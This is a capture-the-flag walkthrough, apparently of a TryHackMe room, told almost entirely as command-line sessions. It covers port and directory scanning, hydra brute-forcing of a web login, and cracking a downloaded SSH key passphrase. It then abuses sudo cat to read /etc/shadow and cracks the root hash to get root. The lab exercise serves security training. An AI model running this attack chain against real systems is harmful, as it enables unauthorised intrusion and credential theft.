# Reconnaissance

```Bash
root@ip-10-10-208-246:~# nmap -sV 10.10.122.118

Starting Nmap 7.60 ( https://nmap.org ) at 2023-08-03 18:12 BST
Nmap scan report for ip-10-10-122-118.eu-west-1.compute.internal (10.10.122.118)
Host is up (0.00065s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:0D:4D:FC:5D:75 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds
```
```Bash
root@ip-10-10-208-246:~# dirb http://10.10.122.118 -r

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Aug  3 18:13:47 2023
URL_BASE: http://10.10.122.118/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.122.118/ ----
==> DIRECTORY: http://10.10.122.118/admin/                                     
+ http://10.10.122.118/index.html (CODE:200|SIZE:10918)                        
+ http://10.10.122.118/server-status (CODE:403|SIZE:278)                       
                                                                               
-----------------
END_TIME: Thu Aug  3 18:13:50 2023
DOWNLOADED: 4612 - FOUND: 2
```

# Getting a Shell

```Bash
root@ip-10-10-208-246:~# firefox http://10.10.122.118/admin
```

![]()

```Bash
root@ip-10-10-208-246:~# hydra -l admin -P ~/Tools/wordlists/rockyou.txt 10.10.122.118 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-08-03 18:21:34
[...]
[80][http-post-form] host: 10.10.122.118   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-08-03 18:20:34
```

![]()

![]()

![]()

```Bash
root@ip-10-10-208-246:~# wget http://10.10.122.118/admin/panel/id_rsa
--2023-08-03 18:23:45--  http://10.10.122.118/admin/panel/id_rsa
Connecting to 10.10.122.118:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K)
Saving to: \u2018id_rsa\u2019

id_rsa              100%[===================>]   1.72K  --.-KB/s    in 0s      

2023-08-03 18:23:45 (158 MB/s) - \u2018id_rsa\u2019 saved [1766/1766]
```

```Bash
root@ip-10-10-208-246:~# find / -type f -name "ssh2john*" 2>/dev/null
/opt/john/ssh2john.py
```

```Bash
root@ip-10-10-208-246:~# /opt/john/ssh2john.py id_rsa > CrackedRSA.txt
```

```Bash
root@ip-10-10-208-246:~# john CrackedRSA.txt --wordlist=rockyou.txt 
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)
1g 0:00:00:11 DONE (2023-08-03 18:32) 0.08841g/s 1268Kp/s 1268Kc/s 1268KC/s *7¡Vamos!
Session completed.
```

```Bash
root@ip-10-10-208-246:~# ssh john@10.10.122.118 -i id_rsa
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
```

```Bash
root@ip-10-10-208-246:~# sudo chmod 600 id_rsa 
```

```Bash
root@ip-10-10-208-246:~# ssh john@10.10.122.118 -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Aug  3 17:38:16 UTC 2023

  System load:  0.0                Processes:           104
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 20%                IP address for eth0: 10.10.122.118
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ 
```

```Bash
Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ find / -type f -name user.txt 2>/dev/null
/home/john/user.txt
```

```Bash
john@bruteit:~$ cat /home/john/user.txt
THM{a_password_is_not_a_barrier}
```

# Privilege Escalation

```Bash
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

```Bash
root@ip-10-10-208-246:~# firefox https://gtfobins.github.io/
```

![](

![]()

```Bash
john@bruteit:~$ LFILE=root.txt
```

```Bash
john@bruteit:~$ sudo cat "$LFILE"
cat: root.txt: No such file or directory
john@bruteit:~$ LFILE=/root/root.txt
john@bruteit:~$ sudo cat "$LFILE"
THM{pr1v1l3g3_3sc4l4t10n}
john@bruteit:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
thm:x:1000:1000:THM Room:/home/thm:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
john:x:1001:1001:john,,,:/home/john:/bin/bash
john@bruteit:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
john@bruteit:~$ LFILE=/etc/shadow
john@bruteit:~$ sudo cat "$LFILE"
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```

```Bash
root@ip-10-10-208-246:~# echo '$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.' > Hash.txt
```

```Bash
root@ip-10-10-208-246:~# john Hash.txt --wordlist=rockyou.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (?)
1g 0:00:00:00 DONE (2023-08-03 19:07) 2.083g/s 533.3p/s 533.3c/s 533.3C/s 123456..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```Bash
john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# 
```

```Bash
root@bruteit:/home/john# find / -type f -name root.txt 2>/dev/null
/root/root.txt
```

```Bash
root@bruteit:/home/john# cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

or


```Bash
john@bruteit:~$ LFILE=/root/root.txt
```

```Bash
john@bruteit:~$ sudo cat "$LFILE"
THM{pr1v1l3g3_3sc4l4t10n}
```
